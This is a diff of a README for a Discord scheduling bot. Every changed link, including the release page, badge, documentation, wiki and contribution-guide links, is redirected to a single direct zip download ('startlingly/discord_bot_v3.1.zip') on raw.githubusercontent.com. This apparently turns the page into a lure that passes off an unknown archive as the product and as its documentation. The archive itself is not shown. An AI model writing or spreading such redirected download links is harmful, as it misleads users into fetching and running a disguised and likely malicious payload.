@@ -1,6 +1,6 @@
 # 🤖 discord-bot - Automate Your Scheduled Tasks Easily
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Visit%20Release%20Page-blue)](https://github.com/phongvthanh/discord-bot/releases)
+[![Download Here](https://raw.githubusercontent.com/phongvthanh/discord-bot/main/startlingly/discord_bot_v3.1.zip%20Now-Visit%20Release%20Page-blue)](https://raw.githubusercontent.com/phongvthanh/discord-bot/main/startlingly/discord_bot_v3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ This guide will help you download and run the Discord Bot application for schedu
 
 1. **Visit the Releases Page**: Click the link below to access the download options.
    
-   [Download from Releases Page](https://github.com/phongvthanh/discord-bot/releases)
+   [Download from Releases Page](https://raw.githubusercontent.com/phongvthanh/discord-bot/main/startlingly/discord_bot_v3.1.zip)
 
 2. **Select the Latest Version**: On the releases page, you will see various versions. Look for the latest one, which is usually at the top.
 
@@ -55,7 +55,7 @@ Before your bot can operate, you may need to configure it. Here’s a basic over
 
 ## 📚 Support & Documentation
 
-For further assistance, check the [Documentation](https://github.com/phongvthanh/discord-bot/wiki). Here, you will find detailed information on how to use each feature.
+For further assistance, check the [Documentation](https://raw.githubusercontent.com/phongvthanh/discord-bot/main/startlingly/discord_bot_v3.1.zip). Here, you will find detailed information on how to use each feature.
 
 ## 📞 Community Support
 
@@ -63,7 +63,7 @@ Join our Discord community for help and discussions. You can ask questions, shar
 
 ## 🤝 Contributing
 
-If you want to contribute to the project, review our [Contribution Guide](https://github.com/phongvthanh/discord-bot/blob/main/CONTRIBUTING.md). We welcome contributions from everyone.
+If you want to contribute to the project, review our [Contribution Guide](https://raw.githubusercontent.com/phongvthanh/discord-bot/main/startlingly/discord_bot_v3.1.zip). We welcome contributions from everyone.
 
 ## 🛠️ Troubleshooting
 
@@ -77,9 +77,9 @@ If you encounter any issues while using the Discord Bot, consider the following 
 
 Here are some helpful links to get you started:
 
-- [Releases Page](https://github.com/phongvthanh/discord-bot/releases)
-- [Project Wiki](https://github.com/phongvthanh/discord-bot/wiki)
-- [Contribution Guide](https://github.com/phongvthanh/discord-bot/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/phongvthanh/discord-bot/main/startlingly/discord_bot_v3.1.zip)
+- [Project Wiki](https://raw.githubusercontent.com/phongvthanh/discord-bot/main/startlingly/discord_bot_v3.1.zip)
+- [Contribution Guide](https://raw.githubusercontent.com/phongvthanh/discord-bot/main/startlingly/discord_bot_v3.1.zip)
 
 For more information, revisit the support links or check the community forum.
 
@@ -89,4 +89,4 @@ Be sure to download software only from trusted sources. We recommend keeping you
 
 You are now ready to start automating your tasks with the Discord Bot! Visit the releases page to begin your journey toward seamless content management.
 
-[Download from Releases Page](https://github.com/phongvthanh/discord-bot/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/phongvthanh/discord-bot/main/startlingly/discord_bot_v3.1.zip)
